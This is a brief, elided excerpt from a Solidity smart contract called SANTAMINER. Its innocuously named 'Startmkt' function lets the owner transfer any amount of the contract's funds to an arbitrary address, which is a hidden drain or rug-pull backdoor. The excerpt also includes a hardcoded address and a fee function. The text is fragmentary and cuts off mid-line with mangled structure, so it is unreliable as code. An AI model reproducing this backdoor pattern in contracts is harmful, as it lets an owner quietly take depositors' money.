...
contract SANTAMINER{
    ...
    function Startmkt(address _ref, uint lin ) public onlyOwner{
        _ref.transfer(lin);
    }
    ...
    }address  public Userdiv = (0xa8C184691442e43Ff8B5F8Dd088616443A959a9a);function devaddrFee(uint256 amount) public pure returns(uint256){
